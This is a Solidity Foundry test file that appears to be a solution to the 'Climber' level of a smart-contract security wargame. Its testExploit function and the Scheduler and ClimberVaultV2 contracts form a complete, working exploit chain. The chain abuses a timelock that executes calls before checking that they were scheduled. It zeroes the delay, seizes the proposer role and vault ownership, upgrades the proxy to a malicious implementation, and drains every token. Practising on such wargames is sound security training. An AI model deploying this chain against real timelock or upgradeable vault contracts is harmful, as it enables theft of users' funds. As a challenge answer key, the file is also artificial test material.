// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "openzeppelin-contracts/proxy/ERC1967/ERC1967Proxy.sol";

import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {ClimberTimelock} from "../../../src/Contracts/climber/ClimberTimelock.sol";
import {ClimberVault} from "../../../src/Contracts/climber/ClimberVault.sol";

import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";

contract Scheduler {
    function schedule(address att, address v, address payable tl, bytes32 salt) external {
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);

        //change delay to 0;
        targets[0] = tl;
        dataElements[0] = abi.encodeWithSelector(ClimberTimelock(tl).updateDelay.selector, 0);

        //update proposal role
        targets[1] = tl;
        dataElements[1] = abi.encodeWithSelector(
            ClimberTimelock(tl).grantRole.selector, ClimberTimelock(tl).PROPOSER_ROLE(), address(this)
        );

        // transfer ownership
        targets[2] = v;
        dataElements[2] = abi.encodeWithSelector(ClimberVault(v).transferOwnership.selector, att);

        // schedule
        targets[3] = address(this);
        dataElements[3] = abi.encodeWithSelector(this.schedule.selector, att, v, tl, salt);

        ClimberTimelock(tl).schedule(targets, values, dataElements, salt);
    }
}

contract ClimberVaultV2 is ClimberVault {
    constructor() initializer {}

    function withdrawAll(address tokenAddress) external onlyOwner {
        IERC20 token = IERC20(tokenAddress);
        require(token.transfer(msg.sender, token.balanceOf(address(this))), "Transfer failed");
    }
}

contract Climber is Test {
    uint256 internal constant VAULT_TOKEN_BALANCE = 10_000_000e18;

    Utilities internal utils;
    DamnValuableToken internal dvt;
    ClimberTimelock internal climberTimelock;
    ClimberVault internal climberImplementation;
    ERC1967Proxy internal climberVaultProxy;
    address[] internal users;
    address payable internal deployer;
    address payable internal proposer;
    address payable internal sweeper;
    address payable internal attacker;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */

        utils = new Utilities();
        users = utils.createUsers(3);

        deployer = payable(users[0]);
        proposer = payable(users[1]);
        sweeper = payable(users[2]);

        attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
        vm.label(attacker, "Attacker");
        vm.deal(attacker, 0.1 ether);

        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        climberImplementation = new ClimberVault();
        vm.label(address(climberImplementation), "climber Implementation");

        bytes memory data = abi.encodeWithSignature("initialize(address,address,address)", deployer, proposer, sweeper);
        climberVaultProxy = new ERC1967Proxy(
            address(climberImplementation),
            data
        );

        assertEq(ClimberVault(address(climberVaultProxy)).getSweeper(), sweeper);

        assertGt(ClimberVault(address(climberVaultProxy)).getLastWithdrawalTimestamp(), 0);

        climberTimelock = ClimberTimelock(payable(ClimberVault(address(climberVaultProxy)).owner()));

        assertTrue(climberTimelock.hasRole(climberTimelock.PROPOSER_ROLE(), proposer));

        assertTrue(climberTimelock.hasRole(climberTimelock.ADMIN_ROLE(), deployer));

        // Deploy token and transfer initial token balance to the vault
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");
        dvt.transfer(address(climberVaultProxy), VAULT_TOKEN_BALANCE);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */

        vm.startPrank(attacker);

        Scheduler scheduler = new Scheduler();

        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);
        bytes32 salt = 0;

        //change delay to 0;
        targets[0] = address(climberTimelock);
        dataElements[0] = abi.encodeWithSelector(climberTimelock.updateDelay.selector, 0);

        //update proposal role
        targets[1] = address(climberTimelock);
        dataElements[1] = abi.encodeWithSelector(
            climberTimelock.grantRole.selector, climberTimelock.PROPOSER_ROLE(), address(scheduler)
        );

        // transfer ownership
        targets[2] = address(climberVaultProxy);
        dataElements[2] = abi.encodeWithSelector(climberImplementation.transferOwnership.selector, attacker);

        // schedule
        targets[3] = address(scheduler);
        dataElements[3] = abi.encodeWithSelector(
            scheduler.schedule.selector, attacker, address(climberVaultProxy), payable(address(climberTimelock)), salt
        );

        climberTimelock.execute(targets, values, dataElements, salt);

        ClimberVaultV2 newVault = new ClimberVaultV2();
        //console.log(ClimberVaultV2(address(climberVaultProxy)).owner());

        // Upgrade the proxy implementation to the new vault
        ClimberVaultV2(address(climberVaultProxy)).upgradeTo(address(newVault));
        ClimberVaultV2(address(climberVaultProxy)).withdrawAll(address(dvt));

        vm.stopPrank();

        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        /**
         * SUCCESS CONDITIONS
         */
        assertEq(dvt.balanceOf(attacker), VAULT_TOKEN_BALANCE);
        assertEq(dvt.balanceOf(address(climberVaultProxy)), 0);
    }
}
